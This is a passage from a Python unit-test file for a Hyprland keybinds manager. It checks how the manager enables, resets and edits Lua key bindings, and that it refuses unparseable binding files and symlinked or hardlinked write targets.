        mine = next(b for b in rows if b["description"] == "Reveal active window on top")
        self.assertEqual(mine["status"], "modified", rows)
        self.assertTrue(mine["can_reset"])


class TestRoundSixteenAgreement(TestRoundTwelveRegressions):
    """Sixteenth round: the model and the writer must read the file the same way."""

    def _row_for(self, key):
        model = keybinds_manager.build_complete_model()
        return next((b for b in model["active"] if b["key"] == key), None)

    def test_a_computed_key_bind_makes_enable_refuse_instead_of_guessing(self):
        # Enable used to delete the user's shadow unbind here and answer success,
        # leaving the shipped default AND the user's binding live on one key.
        self._write('hl.unbind("SUPER + W")\nlocal k = "SUPER + W"\no.bind(k, "mine", "swapwindow")\n')
        row = self._row_for("SUPER + W")
        self.assertFalse(row["can_enable"])
        res = keybinds_manager.enable_keybinding("SUPER + W")
        self.assertFalse(res["success"], res)
        self.assertIn('hl.unbind("SUPER + W")', self._read())

    def test_a_bracket_spelling_bind_is_seen_too(self):
        self._write('hl.unbind("SUPER + W")\no["bind"]("SUPER + W", "mine", "swapwindow")\n')
        self.assertFalse(keybinds_manager.enable_keybinding("SUPER + W")["success"])

    def test_a_disabled_shipped_default_is_listed_in_modified(self):
        self._write('hl.unbind("SUPER + W")\n')
        model = keybinds_manager.build_complete_model()
        row = next(b for b in model["active"] if b["key"] == "SUPER + W")
        self.assertTrue(row["disabled_row"])
        self.assertGreaterEqual(model["total_modified"], 1)

    def test_both_defaults_of_a_two_default_chord_stay_listed(self):
        self._write('hl.unbind("ALT + TAB")\no.bind("ALT + TAB", "My tab", "hyprctl dispatch cyclenext")\n')
        model = keybinds_manager.build_complete_model()
        rows = [b["description"] for b in model["active"] if b["key"] == "ALT + TAB"]
        self.assertIn("Focus on next window", rows)
        self.assertIn("Reveal active window on top", rows)
        self.assertIn("My tab", rows)

    def test_reset_refuses_to_free_a_chord_another_binding_uses(self):
        self._write("")
        keybinds_manager.set_keybinding("ALT + TAB", "Reveal active window on top (mine)",
                                        "my-activate",
                                        old_action="hl.dsp.window.bring_to_top()")
        res = keybinds_manager.reset_keybinding(
            "ALT + TAB", "ALT + TAB", "Focus on next window", "hl.dsp.window.cycle_next()")
        self.assertFalse(res["success"], res)
        self.assertIn('hl.unbind("ALT + TAB")', self._read())

    def test_the_sibling_of_a_two_default_chord_can_be_edited(self):
        self._write("")
        keybinds_manager.set_keybinding("ALT + TAB", "Reveal active window on top (mine)",
                                        "my-activate",
                                        old_action="hl.dsp.window.bring_to_top()")
        res = keybinds_manager.set_keybinding(
            "ALT + TAB", "Focus on next window (mine)", "my-cycle",
            old_key="ALT + TAB", old_description="Focus on next window",
            old_action="hl.dsp.window.cycle_next()")
        self.assertTrue(res["success"], res)
        self.assertEqual(self._read().count('hl.unbind("ALT + TAB")'), 1)

    def test_the_containment_bound_refuses_a_non_lua_target(self):
        import tempfile as _tf
        outside = os.path.join(self.home, ".profile")
        open(outside, "w").write("export X=1\n")
        if os.path.lexists(self.path):
            os.remove(self.path)
        os.symlink(outside, self.path)
        res = keybinds_manager.set_keybinding("SUPER + B", "B", "true")
        self.assertFalse(res["success"], res)
        self.assertEqual(open(outside).read(), "export X=1\n")


class TestRoundSeventeenUnreadableFiles(TestRoundTwelveRegressions):
    """Seventeenth round: an unreadable file certifies nothing, so nothing is removed."""

    def _row_for(self, key):
        model = keybinds_manager.build_complete_model()
        return next((b for b in model["active"] if b["key"] == key), None)

    def test_a_second_bind_in_one_unit_blocks_enable_and_reset(self):
        self._write('hl.unbind("SUPER + W")\n'
                    'o.bind("SUPER + P", "other", "x") ; o.bind("SUPER + W", "mine", "swapwindow")\n')
        row = self._row_for("SUPER + W")
        self.assertFalse(row["can_enable"])
        self.assertFalse(row["can_reset"])
        self.assertFalse(keybinds_manager.enable_keybinding("SUPER + W")["success"])
        self.assertFalse(keybinds_manager.reset_keybinding(
            "SUPER + W", "SUPER + W", "Close window", "hl.dsp.window.close()")["success"])
        self.assertIn('hl.unbind("SUPER + W")', self._read())

    def test_a_cr_commented_bind_blocks_the_verbs(self):
        self._write('hl.unbind("SUPER + W")\n-- off\r o.bind("SUPER + W", "mine", "swapwindow")\n')
        self.assertFalse(keybinds_manager.enable_keybinding("SUPER + W")["success"])
        self.assertIn('hl.unbind("SUPER + W")', self._read())

    def test_the_hl_bind_form_is_seen(self):
        self._write('hl.unbind("SUPER + W")\nhl.bind("SUPER + W", hl.dsp.exec_cmd("my-close"))\n')
        self.assertFalse(keybinds_manager.enable_keybinding("SUPER + W")["success"])

    def test_a_keep_disabled_edit_refuses_before_writing(self):
        self._write("")
        keybinds_manager.set_keybinding("SUPER + ALT + F", "My fullscreen", "", "my-fullscreen-cmd")
        before = self._read()
        res = keybinds_manager.set_keybinding(
            "SUPER + ALT + F", "Full width", "", "hl.dsp.window.fullscreen()",
            old_key="SUPER + ALT + F", old_description="Full width",
            old_action="hl.dsp.window.fullscreen()", keep_disabled=True)
        self.assertFalse(res["success"], res)
        self.assertEqual(self._read(), before)   # nothing was written

    def test_a_non_bindings_target_is_refused(self):
        other = os.path.join(self.home, ".config", "hypr", "hyprland.lua")
        open(other, "w").write("-- compositor\n")
        if os.path.lexists(self.path):
            os.remove(self.path)
        os.symlink(other, self.path)
        res = keybinds_manager.set_keybinding("SUPER + B", "B", "true")
        self.assertFalse(res["success"], res)
        self.assertEqual(open(other).read(), "-- compositor\n")

    def test_a_hardlinked_target_is_refused(self):
        other = os.path.join(self.home, "private.lua")
        open(other, "w").write("-- secret\n")
        if os.path.lexists(self.path):
            os.remove(self.path)
        os.link(other, self.path)
        res = keybinds_manager.set_keybinding("SUPER + B", "B", "true")
        self.assertFalse(res["success"], res)


class TestRoundEighteenCertification(unittest.TestCase):
    """One predicate: a file that is not fully readable certifies nothing."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.home = pathlib.Path(self.tmp)
        (self.home / ".config" / "hypr").mkdir(parents=True)
        self.addCleanup(shutil.rmtree, self.tmp, True)
        for name in ("USER_BINDINGS_PATH", "MENU_CONFIG_PATH", "CACHE_DIR"):
            pass
        self._old = {}
        for attr, value in (
                ("USER_BINDINGS_PATH", self.home / ".config" / "hypr" / "bindings.lua"),
                ("HOME", self.tmp)):
            if attr == "HOME":
                self._old[attr] = os.environ.get("HOME")
                os.environ["HOME"] = value
                continue
            self._old[attr] = getattr(keybinds_manager, attr)
            setattr(keybinds_manager, attr, value)
            self.path = value

    def tearDown(self):
        for attr, value in self._old.items():
            if attr == "HOME":
                os.environ["HOME"] = value
            else:
                setattr(keybinds_manager, attr, value)

    def write(self, text):
        self.path.write_text(text, encoding="utf-8")

    def test_alias_registration_is_unreadable(self):
        self.write('local b = o.bind\nb("SUPER + Q", "hidden", "sneaky")\n'
                   'hl.unbind("SUPER + Q")\n')
        self.assertTrue(keybinds_manager._file_has_unreadable_binds())
        result = keybinds_manager.enable_keybinding("SUPER + Q")
        self.assertFalse(result["success"])
        self.assertIn('hl.unbind("SUPER + Q")', self.path.read_text(encoding="utf-8"))

    def test_escaped_chord_is_unreadable(self):
        self.write('hl.unbind("SUPER + Q")\no.bind("\\x53UPER + Q", "Custom", "true")\n')
        self.assertTrue(keybinds_manager._file_has_unreadable_binds())
        self.assertFalse(keybinds_manager.enable_keybinding("SUPER + Q")["success"])

    def test_an_unknown_registration_is_unreadable(self):
        self.write('hl.something_new("SUPER + Q")\nhl.unbind("SUPER + Q")\n')
        self.assertTrue(keybinds_manager._file_has_unreadable_binds())

    def test_a_chord_free_helper_certifies(self):
        # hl.on/hl.config cannot put a binding on a key: they must not freeze the file.
        self.write('hl.config({ gaps_in = 4 })\n'
                   'hl.on("hyprland.start", function() hl.exec_cmd("nm-applet") end)\n'
                   'o.bind("SUPER + F6", "Mine", "my-cmd")\n')
        self.assertFalse(keybinds_manager._file_has_unreadable_binds())

    def test_a_plain_file_certifies(self):
        self.write('o.bind("SUPER + F6", "Mine", "my-cmd")\n'
                   'o.bind("SUPER + F7", "Other", hl.dsp.window.close())\n')
        self.assertFalse(keybinds_manager._file_has_unreadable_binds())

    def test_a_keep_disabled_move_onto_an_occupied_chord_is_refused(self):
        self.write('o.bind("SUPER + B", "MyBrowser", "omarchy-launch-browser")\n'
                   'hl.unbind("PRINT")\n')
        result = keybinds_manager.set_keybinding("SUPER + B", "Print", "", old_key="PRINT",
                                        old_description="Print", keep_disabled=True)
        self.assertFalse(result["success"])
        body = self.path.read_text(encoding="utf-8")
        self.assertIn("MyBrowser", body)

    def test_a_keep_disabled_move_off_an_occupied_chord_is_allowed(self):
        self.write('o.bind("SUPER + W", "A", "true")\no.bind("SUPER + W", "B", "false")\n'
                   'hl.unbind("SUPER + W")\n')
        result = keybinds_manager.set_keybinding("SUPER + F13", "A", "true", old_key="SUPER + W",
                                        old_description="A", keep_disabled=True)
        self.assertTrue(result["success"], result.get("error"))


if __name__ == "__main__":
    unittest.main()
